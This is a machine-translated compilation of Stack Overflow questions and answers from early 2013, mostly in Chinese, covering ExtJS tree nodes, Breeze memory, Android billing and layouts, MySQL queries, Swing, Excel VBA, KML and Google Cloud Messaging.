var root = this.treeStore.getRootNode();
            var n = {
                    id:--this.counter,
                    leaf: (type=='group') ? false : true,
                    expanded:true,
                    cls:'redtext',
                    text: (name == undefined) ? 'Nowa warstwa': name,
                    gsip:{
                        isGroup: (type=='group') ? true : false,
                        layer:{}
                    }
            };
root.appendChild(n); 
```

上面的代码将新节点添加到根节点，但奇怪的是，新创建的节点包含根节点的所有子节点。因此，由于存在具有相同 id 的节点，树会崩溃。当我删除`id:--this.counter`时，一切正常。我需要这个 ID，而我提供的 ID 是独一无二的。新创建的节点的 internalId 与 id 不同，所有其他现有节点的 internalId=data.id。

以下商店和型号代码：

```
Ext.define('GSIP_PORTAL.model.Layer',{
    extend: 'Ext.data.Model',
    fields: [
             {name: 'id',  type: 'int'} , 'text', 'leaf', 'gsip'],
    idProperty:'id'
});

Ext.define('GSIP_PORTAL.store.Layers', {
    extend: 'Ext.data.TreeStore',
    model:'GSIP_PORTAL.model.Layer',
    proxy: {
        type: 'ajax',
        url: dispatcher.getUrl('getProfile'),
        reader: {
            type: 'json',
            root: 'layers'
        }
    },
    defaultRootId:0,
    root:{
        expanded:true
    }
}); 
```

下面是用于构建树的 json 响应。我使用这个 json 立即构建树，这就是为什么我将属性层作为根。

```
{
   "id":10003,
   "name":"GSIP",
   "defaultProfile":false,
   "layers":[
      {
         "id":10012,
         "expanded":true,
         "text":"GSIP",
         "leaf":false,
         "layers":[
            {
               "id":10013,
               "expanded":true,
               "text":"Dzialki",
               "leaf":true,
               "layers":[

               ],
               "gsip":{
                  "displayName":"Dzialki",
                  "internalName":"test",
                  "isGroup":false,
                  "layer":{
                     "id":1006,
                     "type":{
                        "id":1002,
                        "name":"WMS (queryable)",
                        "description":"WMS z zapytaniami GetFeatureInfo."
                     },
                     "url":"http://192.168.21.10:8080/geoserver/gsip/wms",
                     "layerName":"egb_dzialki"
                  },
                  "order":0
               }
            }
         ],
         "gsip":{
            "displayName":"GSIP",
            "internalName":"test",
            "isGroup":true,
            "order":0
         }
      }
   ],
   "tools":[

   ]
} 
```

在行中添加新节点后出现以下 ext-all-debug 错误`TypeError: records[i] is undefined`： `ns[i].viewRecordId = records[i].internalId`;

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:35:58.153

我认为您应该解决一些问题，因为您的 json 非常狂野。

*   节点记录使用[NodeInterface](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.NodeInterface)包装，因此无需像`leaf`模型中那样声明字段。
*   模型记录字段只能由原始类型（int、bool、string 等）组成。ExtJS 不知道如何处理对象字段——你需要关联。您声明了一个名为 的字段`gsip`，但返回的 json 是一个对象。
*   什么是“工具”？

我建议您清理 json 以`layers`仅包含层次结构。并从那里拿走它。

此外，据我所知，这不是将子节点添加到树的正确方法。这是：

```
var root = this.treeStore.getRootNode();
var n = root.createNode({
    id:--this.counter,
    leaf: (type=='group') ? false : true,
    expanded:true,
    cls:'redtext',
    text: (name == undefined) ? 'Nowa warstwa': name,
    gsip:{
        isGroup: (type=='group') ? true : false,
        layer:{}
    }
});
root.appendChild(n); 
```

然后，`internalId`由 ExtJs 内部用于任何尚未添加到服务器端的记录 - ExtJs 需要自己的内部 id，因为客户端 id 可能不是由客户端设置，而是在保存到服务器后从服务器返回一个数据库。因此，一旦有记录从服务器返回，Ext 就会将 internalId 设置为与 id 字段相同；但在客户端创建的记录不会发生这种情况。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2015-11-27T06:18:54.037

请覆盖您的更新索引功能，它将正常工作。

# breeze - 微风内存使用

> ID：14379035
> 
> 赞同：1
> 
> 时间：2013-01-17T12:23:04.217
> 
> 标签：breeze

我使用 Breeze、ASP.NET Web API 和 MySQL 数据库开发 SPA。数据库的主要实体（Code First EF）有4个一对多关系和20个简单属性。当我下载了 ~ 500 个此实体（具有相关实体的对象的总数 ~ 2000）时，Chrome 选项卡进程使用 250+ Mb 的 RAM（不加载 UI）。如果我保存一些实体，这个价值就会增加。正常吗？我怎样才能减少这个值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-07T03:28:42.233

从breeze v 1.1 开始，我们确实修复了微风中的一些内存泄漏，并在处理大型查询时减少了一些内存压力。此外，微风使用的最新版 Q 库也修复了一些漏洞。希望您现在应该看到更小的足迹。请发布任何进一步的发现......并感谢您对此发表评论。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T18:34:35.143

到目前为止，我无法重现这个结果，所以我可以获得更多信息吗？只是为了确保我清楚，您的查询是针对 500 个根实体，每个有 20 个简单属性和 4 个导航属性，查询的实体总数只有 2000（所以每个导航属性平均有 1 个相关实体？ (2000/(500*4))。

相关实体的大小是多少？

您是使用“EntityQuery.expand”来检索关系属性还是使用“entityAspect.loadNavigationProperty”？

每个轻量级 entityManager 都按键存储每个实体的单个副本，因此内存使用不应扩大，除非您检索更多实体（或使用多个实体管理器。）。

# java - youtube 播放 api - 某些剪辑无法播放

> ID：14379036
> 
> 赞同：0
> 
> 时间：2013-01-17T12:23:04.730
> 
> 标签：java, android, youtube, youtube-api

所以，我正在使用来自 youtube 的新播放 api 进行编程，我注意到一些剪辑说：“这个视频不能在移动设备上播放”。现在我的问题是为什么？有没有办法解决这个问题。喜欢这个`webview.getSettings().setUserAgentString("user-agent-string");`功能。

有什么方法可以在 api 或任何其他解决方案中做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T14:52:52.180

你读过这个吗？

[http://apiblog.youtube.com/2011/12/understanding-playback-restrictions.html](http://apiblog.youtube.com/2011/12/understanding-playback-restrictions.html)

设置播放限制是有原因的。请确保您已阅读 YouTube API 服务条款并且不要规避播放限制。服务条款可以在这里找到：

[https://developers.google.com/youtube/terms](https://developers.google.com/youtube/terms)

# mysql - 使用 UNION、SELECT 和 JOIN 进行 SQL 查询

> ID：14379037
> 
> 赞同：0
> 
> 时间：2013-01-17T12:23:07.620
> 
> 标签：mysql, select, join, union-all

我有三个包含这些字段的表：

`product_views`：`ProductMasterID, Date`

`product_clicks`：`ProductMasterID, Date`

`product_master`：`ProductMasterID, Category`

每当有人在我的网站上查看产品时，它都会在`product_views`. 每当有人点击我网站上的产品时，它都会添加一行`product_clicks`

我正在尝试编写一个 SQL 查询（在 MySQL/PHP 中），它将向我展示产品的受欢迎程度。受欢迎程度是它被查看和点击的次数加在一起。我还希望能够选择一个日期范围，并在某个类别内。

我可以让它在没有日期/类别限制的情况下工作。我现在正在尝试添加日期范围。这是我到目前为止所拥有的，因为上周很受欢迎：

```
SELECT *, COUNT(*) AS Popularity FROM 

    (SELECT product_views.ProductMasterID, product_views.Date 
         FROM product_views 
         WHERE product_views.Date BETWEEN '".date('Y-m-d',strtotime('now'))."' 
            AND '".date('Y-m-d',strtotime('-7days'))."'"."

UNION ALL 

    SELECT product_clicks.ProductMasterID,product_clicks.Date 
        FROM product_clicks 
        WHERE product_clicks.Date BETWEEN '".date('Y-m-d',strtotime('now'))."' 
           AND '".date('Y-m-d',strtotime('-7days'))."'".") a 

GROUP BY ProductMasterID ORDER BY Popularity DESC LIMIT 100" 
```

除了它不起作用，它不会产生任何结果。但是，如果我删除其中任何一个`WHERE`子句，那么由于某种原因它确实有效，但我需要它们两个。所以我的问题是：

1.  如何使它与两个`WHERE`子句一起使用
2.  如何进行类别部分，例如仅选择具有“食品”类别的产品。我想我必须在`product_master`桌子的某个地方加入，但看起来很棘手。

任何帮助将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T12:32:06.543

如果您想使用**JOIN**，这是一个解决方案：

*   [SQLFIDDLE 演示](http://www.sqlfiddle.com/#!2/1156b/1)

询问：

```
SELECT M.PMID, M.CATEGORY, 
(COALESCE(V.VCNT,0) +
COALESCE(C.CCNT,0)) AS TOTAL_COUNT
FROM Master M
LEFT JOIN (SELECT PMID, COUNT(*) AS VCNT
           FROM VIEWS
           WHERE DATE between 
           DATE_ADD(NOW(), INTERVAL - 7 DAY)
           and now()
           GROUP BY PMID) V
ON V.PMID = M.PMID
LEFT JOIN (SELECT PMID, COUNT(*) AS CCNT
           FROM CLICKS
           WHERE DATE between 
           DATE_ADD(NOW(), INTERVAL - 7 DAY)
           and now()
           GROUP BY PMID) C
ON C.PMID = M.PMID
GROUP BY M.PMID
; 
```

结果：

```
| PMID | CATEGORY | TOTAL_COUNT |
---------------------------------
|    1 |    Shoes |           6 |
|    2 |    Books |           4 |
|    3 |     Food |           3 | 
```

* * *

使用 UNION 并仅用于 SQL 部分：

```
SELECT ID, COUNT(*) AS Popularity FROM 
(
    (SELECT product_views.ProductMasterID AS ID, count(*) 
         FROM product_views 
         WHERE product_views.Date BETWEEN '".date('Y-m-d',strtotime('now'))."' 
            AND '".date('Y-m-d',strtotime('-7days'))."'"."
         GROUP BY product_views.ProductMasterID)

UNION ALL 

    (SELECT product_clicks.ProductMasterID AS ID, COUNT(*)
        FROM product_clicks 
        WHERE product_clicks.Date BETWEEN '".date('Y-m-d',strtotime('now'))."' 
           AND '".date('Y-m-d',strtotime('-7days'))."'".") a
     GROUP BY product_clicks.ProductMasterID)

GROUP BY ProductMasterID 
ORDER BY Popularity DESC LIMIT 100" 
```

~~这个怎么样？~~

 ~~```
SELECT M.PMID, M.CATEGORY, COUNT(V.PMID), COUNT(C.PMID)
FROM MASTER M
LEFT JOIN VIEWS V
ON V.PMID = M.PMID
LEFT JOIN CLICKS C
ON C.PMID = M.PMID
WHERE V.DATE BETWEEN NOW() AND NOW() INTERVAL - 7 DAY
AND C.DATE BETWEEN NOW() AND NOW() INTERVAL 7 DAY
GROUP BY M.PMID, V.DATE, C.DATE
; 
```~~

# android - Android 应用内结算版本 3“用户不符合此购买条件”

> ID：14379038
> 
> 赞同：0
> 
> 时间：2013-01-17T12:23:15.063
> 
> 标签：android, in-app-purchase, in-app-billing

我正在我们的 Apk 中实施 InApp Billing V3。

1.  创建签名的 APK
2.  使用开发者控制台上传
3.  添加托管应用内产品。
4.  激活应用内产品，但不要发布应用。
5.  使用开发人员控制台中的公钥修改 apk 中的公钥
6.  在手机上安装 apk 并尝试执行 InApp Purchasing。

我在手机上使用了一个测试帐户，其用户和信用卡与主要商家帐户不同。我已验证应用程序中的公钥是正确的。

我已经使用“android.purchased”等字符串进行了检查，这些都可以正常工作。

我已经多次看到这个问题，解决方案似乎是等待一段时间，并可能删除 APK 并使用 OLD 开发者控制台重新加载它。

在其他页面中，我尝试了以下内容：

*   [用户不符合此购买条件 Android inApp](https://stackoverflow.com/questions/13820674/user-is-not-eligible-for-this-purchase-android-inapp)
*   [用户不符合此购买条件 - 应用内结算](https://stackoverflow.com/questions/13747736/user-is-not-eligible-for-this-purchase-in-app-billing)

我确实在某个时候完成了这项工作，并设法购买了该物品。不幸的是，我不知道我到底做了什么才能突然让它工作，并想记录未来使用所需的步骤（我怀疑它可能是开发者控制台中时间和变化的混合）。所以我用一个新的包名重新开始了这个过程，现在我得到的只是“用户没有资格购买这个项目”。

谷歌文档和现实世界在 InApp 购买方面显然存在差异，但无论我做什么，它似乎都不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-29T08:52:14.357

这个错误只有两个原因： 1> 在 Play Store App 中登录的帐户没有测试权限。将此帐户添加到 Google Play 上的测试帐户

2> 发布者不能购买自己的产品。应用内甚至付费应用

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-18T12:11:06.157

我似乎找到了一系列可行的步骤。今天尝试了两次，两次 IAB 都在几个小时后工作。我遵循的步骤：

*   使用 OLD Developer Console 视图创建签名版本并上传到 Google 商店。在旧控制台中填写所有应用程序详细信息。
*   切换到新的开发者控制台
*   上传使用新公钥构建的 APK——因为旧的上传不会将 IAB 设置为支持。
*   添加托管 InApp 产品并激活它
*   稍等片刻。根据某些网页，这可能需要几个小时。在我的测试中，这大约需要 2 个小时。

# javascript - 从图像 uri 显示图像

> ID：14379044
> 
> 赞同：1
> 
> 时间：2013-01-17T12:23:38.490
> 
> 标签：javascript, imageurl

我无法显示来自文件 URL 的照片。`[Object HTML IMAGE ELEMENT]`即使我认为我将此元素指向图像源，我也只会进入页面。

```
 //database query results...
    for(var i = 0; i < len; i++){
        theID = results.rows.item(i).id;
        console.log(theID);
        theName = results.rows.item(i).username;
            htmlStr += theName;
        console.log(theName);
        thePhoto = results.rows.item(i).imagepath;
        console.log(thePhoto);

        var imageHold= new Image();
        imageHold.src = thePhoto;
        console.log("this is the src:"+imageHold.src);//THIS IS GIVING ME THE PATH

        var userDiv = document.createElement("div");//Create the div

        userDiv.innerHTML=htmlStr+imageHold;//IS THE PROBLEM WHAT I AM DOING HERE?

        document.getElementById('showUsers').appendChild(userDiv);//append it to the document
        userDiv.style.display = 'block';
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T12:26:14.437

尝试

```
userDiv.innerHTML=htmlStr;
userDiv.appendChild(imageHold); 
```

`htmlStr`应该有有效的标记。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:28:28.653

You can't simply use:

> userDiv.innerHTML=htmlStr+imageHold;

Instead use:

```
 userDiv.innerHTML=htmlStr+'<img src="'+imageHold.src+'" />"; 
```

# android - 文本视图不在正确的位置

> ID：14379046
> 
> 赞同：0
> 
> 时间：2013-01-17T12:23:43.393
> 
> 标签：android, android-layout

我真的是android中的新手。我只想创建一个带有一些文本视图的布局，一张图片。

我做到了，它在我的编辑器上看起来不错。（我正在使用 eclipse/adt）。

当我第一次尝试时，结果很糟糕（见图）。之后我在另一个配置上尝试了它，仍然很可怕。

据我所知，民进党是为了独立，但我认为不是。但我想，我做错了什么。

请帮助我，并启发我，我做错了什么，为什么文本视图和图片会移动？

上图从左到右：

*   编辑
*   埃克莱尔，3.3 QVGA 320x480 mdpi
*   果冻豆 3.2 WQVGA 240x400 ldpi

![文本视图](../Images/262d2556c1259c9c869aa90c959a8237.png)

我的代码：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:id="@+id/quizLayout"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:background="@drawable/quiz_background"
tools:context=".Quiz" >

<Button
    android:id="@+id/btnGo"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentBottom="true"
    android:layout_centerHorizontal="true"
    android:layout_marginBottom="36dp"
    android:text="@string/go" />

<TextView
    android:id="@+id/tvQuestion"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentLeft="true"
    android:layout_alignParentTop="true"
    android:layout_marginLeft="19dp"
    android:layout_marginTop="60dp"
    android:text="@string/question" />

<TextView
    android:id="@+id/tvPoints"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignLeft="@+id/tvQuestion"
    android:layout_below="@+id/tvQuestion"
    android:layout_marginTop="31dp"
    android:text="@string/points" />

<ImageView
    android:id="@+id/imgCarHolder"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignLeft="@+id/tvPoints"
    android:layout_below="@+id/tvPoints"
    android:layout_marginTop="26dp"

    android:contentDescription="@string/dummy" />

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T14:21:26.150

如果您在任何布局文件中使用高度或宽度或任何其他空间上下文的固定值，我建议您针对每个屏幕尺寸单独进行。例如，分辨率为 360*480 和 480*640 的屏幕的 35 dp 是不同的。因此，如果您在很大程度上使用常量，您的屏幕看起来很奇怪。

# java - 如何在自己的私有 void 中正确使用 JFrame

> ID：14379049
> 
> 赞同：0
> 
> 时间：2013-01-17T12:23:56.960
> 
> 标签：java, swing, class, components, actionlistener

所以基本上我在这里有点困惑，我使用的是 Eclipse 的 WindowsPro Builder 插件，它使所有 JFrame 组件都在一个自定义的 initialize() 类中。这给我带来了一个问题，通常我会在开始时定义我的组件，以便我可以通过我的程序公开访问它们。不，我有第二节课，但我无法访问我的组件。例如，我不知道如何为整个初始化类制作统一的 ActionListener。

我也想从 textarea 获取输入，但我该怎么做呢？当一切都在范围之外？如您所见，我调用了 SaveToFile 类，在该类中我想从 textarea 获取输入，但是我该怎么做呢？

```
 import javax.swing.*;

 public class FunctionsGUI  {

private JFrame frame;

/**
 * Launch the application.
 */
public static void main(String[] args) {
    EventQueue.invokeLater(new Runnable() {
        public void run() {
            try {
                FunctionsGUI window = new FunctionsGUI();
                window.frame.setVisible(true);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    });
}

/**
 * Create the application.
 */
public FunctionsGUI() {
    initialize();

}

/**
 * Initialize the contents of the frame.
 */
private void initialize ()   {

    try {
          UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch(Exception e) {
          System.out.println("Error setting native LAF: " + e);
        }

    frame = new JFrame();
    frame.setBounds(100, 100, 571, 531);
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    SpringLayout springLayout = new SpringLayout();
    frame.getContentPane().setLayout(springLayout);

    JTextPane textPane = new JTextPane();
    springLayout.putConstraint(SpringLayout.NORTH, textPane, 10, SpringLayout.NORTH, frame.getContentPane());
    springLayout.putConstraint(SpringLayout.WEST, textPane, 10, SpringLayout.WEST, frame.getContentPane());
    springLayout.putConstraint(SpringLayout.SOUTH, textPane, 462, SpringLayout.NORTH, frame.getContentPane());
    springLayout.putConstraint(SpringLayout.EAST, textPane, 545, SpringLayout.WEST, frame.getContentPane());
    frame.getContentPane().add(textPane);
    frame.setLocationRelativeTo(null);
    frame.setTitle("Calcolo");

    JMenuBar menuBar = new JMenuBar();
    frame.setJMenuBar(menuBar);

    JMenu mnFile = new JMenu("File");
    menuBar.add(mnFile);

    final JMenuItem mntmSave = new JMenuItem("Save");
    mntmSave.addActionListener(new ActionListener() {
        public void actionPerformed(ActionEvent e) {
            SaveToFile sv = new SaveToFile();
        }
    });
    mnFile.add(mntmSave);

    JMenu mnOptions = new JMenu("Options");
    menuBar.add(mnOptions);

    JMenu mnHelp = new JMenu("Help");
    menuBar.add(mnHelp);

    final JMenuItem AboutMenu = new JMenuItem("About");
    AboutMenu.addActionListener(new ActionListener() {

        public void actionPerformed(ActionEvent e) {
            if (e.getSource().equals(AboutMenu)) {
                 JDialog dialog = new JDialog();
                    dialog.setTitle("Search Dialog");
                    dialog.getContentPane().add(new JLabel("Just a test"));
                    dialog.setSize(300,300);
                    dialog.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
                    dialog.setLocationRelativeTo(frame);
                    dialog.setVisible(true);

            if (e.getSource().equals(mntmSave));
                SaveToFile sv = new SaveToFile ();
            }
        }
    });
    mnHelp.add(AboutMenu);

}
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T12:33:24.767

> eclipse的WindowsPro Builder插件，它使所有的JFrame组件都在一个自定义的initialize()类中。

`initialize()`只是一个方法而不是一个类。这里的课是`FunctionsGUI`。

> 这给我带来了一个问题，通常我会在开始时定义我的组件，以便我可以通过我的程序公开访问它们。

这取决于你在做什么，但这可能是一个糟糕的设计。

> 不，我有第二节课，但我无法访问我的组件。

实现一个 getter 以返回您需要的组件（甚至是所有组件）。

> 如您所见，我调用了 SaveToFile 类，在该类中我想从 textarea 获取输入，但是我该怎么做呢？

例如，您可以在构造函数中传递对`JTextField`to`SaveToFile`类的引用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-17T12:52:54.243

我想告诉你一个方法。在 SaveToFile 类中有一个可以接受 String 的构造函数，如下所示。将文本窗格中的文本作为字符串传递给此构造函数或方法。甚至一种方法也很好。但是有这两个中的任何一个。

```
public class SaveToFile {

    public SaveToFile(String textinput) {
        System.out.println(textinput);
    }

    // if you prefer to have a differrent method do like below.

    public void doSomething(String textinput) {
            System.out.println(textinput);
    }
} 
```

现在将您的听众更改为如下所示，

```
final JMenuItem mntmSave = new JMenuItem("Save");
    mntmSave.addActionListener(new ActionListener() {
        public void actionPerformed(ActionEvent e) {
            SaveToFile sv = new SaveToFile(textPane.getText());
        }
}); 
```

如果你不想要一个构造函数，

```
final JMenuItem mntmSave = new JMenuItem("Save");
        mntmSave.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                  SaveToFile sv = new SaveToFile();
                  sv.doSomething(textPane.getText());
            }
}); 
```

我正在做的是将文本从文本面板发送到 SaveToFile 类。在那里你可以使用这个字符串。确保将 JTextPane 声明为 final，如下所示

```
final JTextPane textPane = new JTextPane(); 
```

现在您从文本窗格中获得了一个文本，该文本位于 SaveToFile 类的另一个类中。正如我所说，它只是“一种方式而不是方式”。

# excel - 如何在不同的单元格上输出结果？(VBA Excel 2007)

> ID：14379055
> 
> 赞同：0
> 
> 时间：2013-01-17T12:24:23.973
> 
> 标签：excel, vba

我已经计算了一些值，应该有两个结果。我想在两个不同的单元格中显示这些结果。

当我更改 A1 或 A2 值时，excel 将停止。无论如何我可以显示这些值吗？

```
Sheet1 
Private Sub Worksheet_Change(ByVal Target As Range)
   Call DisplayResult 
End Sub

Module1 
Sub DisplayResult() 
     Range("A3").Value = Range("A1").Select.Value + Range("A2").Select.Value     
     Range("B3").Value = Range("B1").Select.Value + Range("B2").Select.Value 
End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:30:02.167

你根本不需要在这里使用 .select -

工作表代码：

```
Private Sub Worksheet_Change(ByVal Target As Range)

If Not Intersect(Sheet1.Range("A1:B2"), Target) Is Nothing Then
    MsgBox "Hello"
End If

End Sub 
```

模块代码：

```
Sub DisplayResult()

Sheet1.Range("A3").Value = Sheet1.Range("A1").Value + Sheet1.Range("A2").Value
Sheet1.Range("B3").Value = Sheet1.Range("B1").Value + Sheet1.Range("B2").Value

End Sub 
```

如果您将该`Call DisplayResult`行放在 Worksheet_Change 子例程中而不限制应该触发的范围，那么它将最终进入无限循环（DisplayResult 触发 Worksheet_Change 子程序）。什么时候应该触发 DisplayResult 代码？仅当您更改 Range A1:B2 时？

# google-maps-api-3 - 谷歌地图 v3 kml 数据未显示

> ID：14379059
> 
> 赞同：1
> 
> 时间：2013-01-17T12:24:35.627
> 
> 标签：google-maps-api-3, kml

我正在通过 php 生成一个动态 kml 文件以用于谷歌地图，我的所有数据都存储在 MySQL 数据库中，然后我从中生成 kml，它可以处理我拥有的大多数条目并显示正确的边界数据。

但是我有一个拒绝工作的条目，我从谷歌地图调用的萤火虫中收到以下网络错误，我确定这就是它不显示边界数据的原因

```
http://mt1.googleapis.com/vt?lyrs=m@205000000&src=apiv3&hl=en-GB&x=1021&y=681&z=11&s=&style=api%7Csmartmaps - Aborted

http://mt1.googleapis.com/vt?lyrs=m@205000000&src=apiv3&hl=en-GB&x=1021&y=681&z=11&s=&style=api%7Csmartmaps - Aborted

http://mt0.googleapis.com/vt?lyrs=m@205000000&src=apiv3&hl=en-GB&x=1024&y=679&z=11&s=Galileo&style=api%7Csmartmaps - Aborted

http://mt0.googleapis.com/vt?lyrs=m@205000000&src=apiv3&hl=en-GB&x=1024&y=681&z=11&s=G&style=api%7Csmartmaps - Aborted 
```

我一生都无法弄清楚为什么它不适用于这个 1 区域 Barnet...

数据本身是正确的，因为它适用于我创建的融合表： [https ://www.google.com/fusiontables/DataSource?docid=1U6gSR5u3L4P3SQxeuDynXp4a0De3X-2_FBcube4#map:id=3](https://www.google.com/fusiontables/DataSource?docid=1U6gSR5u3L4P3SQxeuDynXp4a0De3X-2_FBcube4#map:id=3)

我也知道 KML 文件是有效的，因为它适用于我拥有的其他位置。

工作地点： [Hounslow](http://2012.reelfilmlocations.co.uk/admin/boroughs/extended/testing.php?id_ctg=193) [Enfield](http://2012.reelfilmlocations.co.uk/admin/boroughs/extended/testing.php?id_ctg=194) [Lea Valley Park](http://2012.reelfilmlocations.co.uk/admin/boroughs/extended/testing.php?id_ctg=196)

不工作的位置： [Barnet](http://2012.reelfilmlocations.co.uk/admin/boroughs/extended/testing.php?id_ctg=195)

我真的不知道如何解决这个问题，任何关于错误的想法将不胜感激。（生成的 kml 文件可以使用上述链接页面底部的下载按钮下载）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T14:04:35.327

您在该页面上的[KML无效。](http://2012.reelfilmlocations.co.uk/KML/KML_Borough.php?id_ctg=195&seed=20130117140001)

[饲料验证器](http://feedvalidator.org/check.cgi?url=http%3A%2F%2F2012.reelfilmlocations.co.uk%2FKML%2FKML_Borough.php%3Fid_ctg%3D195%26seed%3D20130117140001)

[谷歌地图](https://maps.google.com/maps?q=http%3a%2F%2F2012.reelfilmlocations.co.uk%2FKML%2FKML_Borough.php%3Fid_ctg%3D195%26seed%3D20130117140001&hl=en&sll=32.824552,-117.108978&sspn=0.691256,0.883026&t=m&z=10)

# android - Android 如何扫描卡片颜色、数字

> ID：14379063
> 
> 赞同：1
> 
> 时间：2013-01-17T12:24:52.320
> 
> 标签：android, android-ndk

嗨，我最近正在开发 android 应用程序，我需要 **通过相机在 android 中扫描纸牌游戏卡的数字形状和符号**谁能建议我解决这个问题的最佳方法并给我一些教程和链接

1.  我需要从一组可用的卡片示例中扫描形状和颜色

10 黑桃 j 心 q 钻石

当我开始扫描卡片时，我应该识别卡片的所有符号和颜色。

1.  当我开始扫描单张卡片时，帮助我为单张卡片提供解决方案，它应该识别卡片的形状、颜色和符号

# java - 如何在Android java中的较大图像上从默认0,0位置更改显示

> ID：14379064
> 
> 赞同：0
> 
> 时间：2013-01-17T12:24:59.090
> 
> 标签：java, android

我找不到这个问题的答案，它可能很简单..

我的屏幕上有一个更大的图像（世界地图），我可以在地图上水平和垂直移动。问题是，当我启动显示地图的活动时，显示的默认位置是 0,0 位置，因此它显示图片的开头。

```
_______________
| screen |     |
|________|     |
|              |
|     MAP      |
|______________|

_______________
|      ______  |
|     |screen| |
|     |______| |
|              |
|     MAP      |
|______________| 
```

如图所示，这就是我想要做的，改变默认显示视图以在地图上的其他地方显示自己，我不知道该怎么做..

我的布局是这样的。。

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/worldLinearLayout"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    tools:context=".WorldMapActivity" >

    <org.kema.view.VScroll
        android:id="@+id/vScroll"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent" >

        <org.kema.view.HScroll
            android:id="@+id/hScroll"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent" >

            <RelativeLayout
                xmlns:android="http://schemas.android.com/apk/res/android"
                xmlns:tools="http://schemas.android.com/tools"
                android:id="@+id/relativeLayoutWorldMap"
                android:layout_width="fill_parent"
                android:layout_height="fill_parent" >

                <ImageView
                    android:id="@+id/imageViewWorldMap"
                    android:layout_width="fill_parent"
                    android:layout_height="fill_parent"
                    android:adjustViewBounds="false"
                    android:contentDescription="World map"
                    android:src="@drawable/contacts_map" />
            </RelativeLayout>
        </org.kema.view.HScroll>
    </org.kema.view.VScroll>

</LinearLayout> 
```

知道该怎么做吗？谢谢

编辑：澄清一下，我的问题不是关于在屏幕上移动，我已经解决了这个问题，它只是在您进入屏幕时更改默认视图的位置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-06T08:51:18.050

世界地图绘制完成后，我使用 vScroll 和 hScroll 在地图上移动。你可以使用 scrollBy() 方法与两个滚动一起移动。由于在创建布局时我没有找到任何可用于更改布局位置的东西，我试图通过使用 scrollBy() 方法来移动它来移动视图。问题是我在画之前就在移动，所以自然什么也没发生。

我设法像这样解决了这个问题。在 onCreate 你 findViewById，并调用绘制地图的方法，在我的例子中是 drawWorldMap(ImageView)。由于我在这里使用的是 scrollBy()，所以在实际绘制所有内容之前，它没有用。Android默认首先调用onCreateView()创建所有视图，然后调用onCreate()，绘制完成后，再次调用onCreateView()。

在最后一次调用时，一切都准备好了，您可以调用 scrollBy() 来滚动以实际移动地图上的位置。所以我的解决方案是，在调用 drawWorldMap() 之后，我使用布尔值将其设置为 true，因此我知道地图已绘制并且卷轴已膨胀，并且在我上次在 onCreateView() 方法中返回后，我只是检查了对于布尔值是真的，如果是，我用scrollBy（）移动了滚动的位置。

如果其他人遇到任何问题，我可以在更详细的代码中帮助他，但是由于现在似乎没有人遇到同样的问题，所以我不会太详细（代码方面）。

祝你今天过得愉快..

# push-notification - 谷歌云消息服务的可靠性

> ID：14379065
> 
> 赞同：4
> 
> 时间：2013-01-17T12:24:59.877
> 
> 标签：push-notification, push, google-cloud-messaging

如果我可以将服务器中发生的重要事件通知给应用程序用户，我正在研究。所以，我尝试了 Google-Cloud-Messaging 来实现推送通知。不幸的是，我可以看到消息延迟传递，没有确切的延迟传递时间。我什至尝试在 gmail 中发送邮件，而 gmail 本身的推送通知迟到了，没有时间限制。因此，我发现我无法使用 google-cloud-messaging 服务向用户传递重要事件。有没有其他方法可以通知用户重要事件？

注意：我不想使用短信。而且我也不想退出应用程序，因为它会消耗电池寿命。

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-08T23:29:06.797

实际上，这是由于 5228、5229、5230 端口在我的服务器中被阻塞。因此，它需要由网络管理员解除阻止。同样，如果其他接收器（如 facebook 应用程序、gmail 等）处于活动状态并说它们被您的服务器管理员阻止，它们同步不会成功，并且稍后在同步您的应用程序时需要时间。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-29T06:58:10.523

可能是由于其他问题，也可能是由于发送服务器的地理位置和接收方的 IP 地址。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-18T13:54:31.463

